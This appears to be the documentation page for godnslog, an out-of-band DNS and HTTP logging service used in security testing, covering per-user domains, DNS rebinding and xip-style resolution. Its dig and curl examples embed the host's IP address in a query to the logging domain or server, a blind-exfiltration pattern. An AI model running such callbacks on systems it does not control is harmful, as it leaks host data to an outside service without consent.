# Introduce

Features:

- Multi-user
- DNSLOG
- HTTPLOG
- DNS Rebinding
- Client API
- xip


Each user can get one individual domain which prefix is called `shortId`.


![](https://s1.ax1x.com/2020/08/31/dOzKZd.png)

```
712hu2c4gy34.godnslog.com: user domain
712hu2c4gy34: shortId
```

## DNSLOG

Any dns record of `712hu2c4gy34.godnslog.com` or `*.712hu2c4gy34.godnslog.com` will be record in DNSLOG table, and will be clear after 48 hours.

```bash
dig `/sbin/ifconfig eth0|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"`.712hu2c4gy34.godnslog.com
```


![](https://s1.ax1x.com/2020/08/31/dXPba4.png)

Records infomations：
- domain
- IP
- time

## DNS Rebinding

See [](/document/rebinding)

## HTTPLOG

Any http request of accessing  `http://${IP}/log/${shortId}/${variable}` will be record in HTTPLOG table and it will be clear after 48 hours

HTTPLOG informations:

- IP
- Method
- Path
- User-Agent
- Content-Type
- Data body
- Time

```bash
curl http://100.100.100.100/log/ktqlujjpgc4j/`/sbin/ifconfig eth0|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"`
```


![](https://s1.ax1x.com/2020/08/31/dXiiIH.png)

## client api


![](https://s1.ax1x.com/2020/08/31/dXicy6.png)


## xip

Like <http://xip.io>

Any custom resolve by request

	   10.0.0.1.xip.io   resolves to   10.0.0.1
	      www.10.0.0.1.xip.io   resolves to   10.0.0.1
	   mysite.10.0.0.1.xip.io   resolves to   10.0.0.1
	  foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1